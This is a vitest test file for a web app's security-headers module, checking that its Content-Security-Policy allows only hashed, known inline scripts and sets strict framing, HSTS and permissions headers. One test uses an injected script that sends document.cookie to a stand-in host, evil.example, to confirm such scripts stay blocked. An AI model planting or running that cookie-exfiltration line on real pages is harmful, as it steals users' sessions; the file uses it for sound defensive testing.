import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { contentSecurityPolicy, documentPolicy, inlineScriptHashes, securityHeaders } from '@lib/securityHeaders';
import { THEME_BOOT_SCRIPT } from '@lib/theme';

const directives = (apiUrl: string, html = ''): Map<string, string> => {
    const policy = contentSecurityPolicy(apiUrl, html);
    return new Map(policy.split('; ').map((directive) => [directive.split(' ')[0] ?? '', directive.slice(directive.indexOf(' ') + 1)]));
};

const sha256 = (text: string): string => `'sha256-${createHash('sha256').update(text).digest('base64')}'`;

// The shapes TanStack Router writes (as in a built page): the scroll restoration, the hydration data and the stream boundary.
const SCROLL = '(function(a,f){scrollTo(0,0)})("tsr-scroll-restoration-v1_3");document.currentScript.remove()';
const HYDRATION = '(self.$R=self.$R||{})["tsr"]=[];self.$_TSR={};$_TSR.e();{let s=document.currentScript,p;s.remove()}';
const CHUNK = '$_TSR.router=($R=>$R[0]={})($R["tsr"]);document.currentScript.remove()';
const BOUNDARY = 'document.currentScript.remove();/*$tsr-stream-boundary*/';

describe('inlineScriptHashes', () => {
    it('hashes the theme boot script and the framework’s scripts, with and without attributes', () => {
        const html = `<script>${THEME_BOOT_SCRIPT}</script><script>${SCROLL}</script><script data-tsr-stream-part="">${HYDRATION}</script><script>${CHUNK}</script><script>${BOUNDARY}</script>`;
        expect(inlineScriptHashes(html)).toEqual([THEME_BOOT_SCRIPT, SCROLL, HYDRATION, CHUNK, BOUNDARY].map(sha256));
    });

    it('does not hash an inline script it does not know, so an injected one stays blocked', () => {
        expect(inlineScriptHashes(`<script>fetch('https://evil.example/'+document.cookie)</script><script>${CHUNK}</script>`)).toEqual([sha256(CHUNK)]);
        expect(inlineScriptHashes('<script data-tsr-stream-part="">alert(1)</script>')).toEqual([]);
    });

    it('skips external scripts, JSON-LD and other data blocks, and empty scripts', () => {
        const html =
            '<script type="module" async="" src="/assets/index.js"></script><script type="application/ld+json">{"@context":"https://schema.org"}</script><script type="application/json">{}</script><script></script>';
        expect(inlineScriptHashes(html)).toEqual([]);
    });

    it('hashes the text the browser parses: CRLF and CR become LF, NUL becomes U+FFFD', () => {
        expect(inlineScriptHashes('<script>$_TSR.a()\r\nb()\rc();document.currentScript.remove()</script>')).toEqual([sha256('$_TSR.a()\nb()\nc();document.currentScript.remove()')]);
        expect(inlineScriptHashes('<script>$_TSR.x="\0";document.currentScript.remove()</script>')).toEqual([sha256('$_TSR.x="�";document.currentScript.remove()')]);
    });

    it('lists a script that repeats only once', () => {
        expect(inlineScriptHashes(`<script>${BOUNDARY}</script><script>${BOUNDARY}</script>`)).toEqual([sha256(BOUNDARY)]);
    });
});

describe('contentSecurityPolicy', () => {
    const csp = directives('https://api.sitehp.app/', `<script>${THEME_BOOT_SCRIPT}</script>`);

    it('allows the inline scripts of the page by hash, never by unsafe-inline', () => {
        expect(csp.get('script-src')).toBe(`'self' ${sha256(THEME_BOOT_SCRIPT)}`);
        expect(directives('https://api.sitehp.app/').get('script-src')).toBe("'self'");
        for (const [name, value] of csp) if (name.startsWith('script-src')) expect(value).not.toContain('unsafe-inline');
    });

    it('takes styles from the site, with only style attributes inline', () => {
        expect(csp.get('style-src')).toBe("'self'");
        expect(csp.get('style-src-attr')).toBe("'unsafe-inline'");
    });

    it('loads everything from the site itself by default and never runs plugins', () => {
        expect(csp.get('default-src')).toBe("'self'");
        expect(csp.get('object-src')).toBe("'none'");
        expect(csp.get('base-uri')).toBe("'none'");
    });

    it('lets the browser call the API origin, and only its origin', () => {
        expect(csp.get('connect-src')).toBe("'self' https://api.sitehp.app");
        expect(directives('http://localhost:4000/v1').get('connect-src')).toBe("'self' http://localhost:4000");
    });

    it('cannot be framed and keeps forms on the site', () => {
        expect(csp.get('frame-ancestors')).toBe("'none'");
        expect(csp.get('form-action')).toBe("'self'");
    });
});

describe('documentPolicy', () => {
    it('applies the policy to a production response', () => {
        expect(documentPolicy('https://api.sitehp.app', '<script>boot()</script>', true)).toBe(contentSecurityPolicy('https://api.sitehp.app', '<script>boot()</script>'));
    });

    it('sets none on the dev server, whose inline modules and hot reload a strict policy would block', () => {
        expect(documentPolicy('http://localhost:4000', '<script>boot()</script>', false)).toBeUndefined();
    });
});

describe('securityHeaders', () => {
    const headers = securityHeaders();

    it('asks for HTTPS for two years, on every subdomain, and qualifies for the preload list', () => {
        expect(headers['Strict-Transport-Security']).toBe('max-age=63072000; includeSubDomains; preload');
    });

    it('sends only the origin as the referrer to other sites', () => {
        expect(headers['Referrer-Policy']).toBe('strict-origin-when-cross-origin');
    });

    it('cannot be framed, never sniffs types and keeps its own browsing context', () => {
        expect(headers['X-Frame-Options']).toBe('DENY');
        expect(headers['X-Content-Type-Options']).toBe('nosniff');
        expect(headers['Cross-Origin-Opener-Policy']).toBe('same-origin');
    });

    it('turns off browser features the site never uses', () => {
        for (const feature of ['camera', 'microphone', 'geolocation', 'payment']) expect(headers['Permissions-Policy']).toContain(`${feature}=()`);
    });

    it('carries no Content-Security-Policy: that one is built per page', () => {
        expect(Object.keys(headers)).not.toContain('Content-Security-Policy');
    });
});
